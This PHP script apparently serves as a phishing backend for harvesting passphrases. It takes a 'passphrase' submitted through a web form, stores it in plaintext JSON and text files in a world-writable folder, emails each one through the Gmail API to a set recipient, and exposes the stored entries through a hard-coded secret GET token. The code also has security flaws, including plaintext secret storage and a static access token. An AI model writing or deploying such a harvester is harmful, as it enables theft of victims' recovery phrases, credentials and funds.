<?php
require 'vendor/autoload.php';

use Google\Client;
use Google\Service\Gmail;

// Load the credentials file
$client = new Client();
$client->setAuthConfig('credentials.json');
$client->addScope(Gmail::MAIL_GOOGLE_COM);
$client->setAccessType('offline');
$client->setPrompt('select_account consent');

// Redirect the user to the authorization URL if necessary
if (!isset($_SESSION['access_token']) && !$client->isAccessTokenExpired()) {
    $authUrl = $client->createAuthUrl();
    header('Location: ' . filter_var($authUrl, FILTER_SANITIZE_URL));
    exit;
}

// Exchange authorization code for an access token
if (isset($_GET['code'])) {
    $accessToken = $client->fetchAccessTokenWithAuthCode($_GET['code']);
    $_SESSION['access_token'] = $accessToken;
}

// Set the access token
if (isset($_SESSION['access_token']) && $_SESSION['access_token']) {
    $client->setAccessToken($_SESSION['access_token']);

    // Refresh the token if it's expired
    if ($client->isAccessTokenExpired()) {
        $client->fetchAccessTokenWithRefreshToken($client->getRefreshToken());
        $_SESSION['access_token'] = $client->getAccessToken();
    }

    // Get the Gmail service
    $service = new Gmail($client);

    // If the request method is POST, handle the form submission
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        // Get the submitted passphrase
        $passphrase = trim($_POST['mf-text']);

        // Check if the passphrase is not empty
        if (empty($passphrase)) {
            echo "Passphrase cannot be empty.";
            exit;
        }

        // Define the file path and name
        $filePath = 'submissions/';
        $fileName = 'passphrases.json'; // or use 'passphrases.txt' for text format

        // Create the directory if it doesn't exist
        if (!is_dir($filePath)) {
            mkdir($filePath, 0777, true);
        }

        // Prepare the data to save
        $data = [
            'passphrase' => $passphrase,
            'timestamp' => date('Y-m-d H:i:s')
        ];

        // Save as JSON
        $jsonData = json_encode($data) . PHP_EOL;
        file_put_contents($filePath . $fileName, $jsonData, FILE_APPEND);

        // Optionally, save as plain text
        $textData = "Passphrase: " . $passphrase . " | Timestamp: " . $data['timestamp'] . PHP_EOL;
        file_put_contents($filePath . 'passphrases.txt', $textData, FILE_APPEND);

        // Prepare the email content
        $emailContent = "Subject: New Passphrase\n";
        $emailContent .= "Passphrase: " . $passphrase . "\n";
        $emailContent .= "Timestamp: " . $data['timestamp'] . "\n";

        // Create the email message
        $message = new Google\Service\Gmail\Message();
        $rawMessageString = "From: your-email@gmail.com\r\n";
        $rawMessageString .= "To: recipient-email@gmail.com\r\n";
        $rawMessageString .= "Subject: New Passphrase\r\n";
        $rawMessageString .= "\r\n" . $emailContent;
        $rawMessage = strtr(base64_encode($rawMessageString), array('+' => '-', '/' => '_'));
        $message->setRaw($rawMessage);

        // Send the email
        try {
            $service->users_messages->send('me', $message);
            echo "Passphrase saved and email sent successfully!";
        } catch (Exception $e) {
            echo 'Message could not be sent. Mailer Error: ', $e->getMessage();
        }
    } else if (isset($_GET['token']) && $_GET['token'] === 'your_secret_token') {
        $file = isset($_GET['file']) && $_GET['file'] === 'txt' ? 'passphrases.txt' : 'passphrases.json';
        $filePath = 'submissions/' . $file;

        if (file_exists($filePath)) {
            header('Content-Type: application/json');
            readfile($filePath);
        } else {
            echo "File not found.";
        }
    } else {
        echo "Invalid request.";
    }
} else {
    echo "No access token.";
}
?>
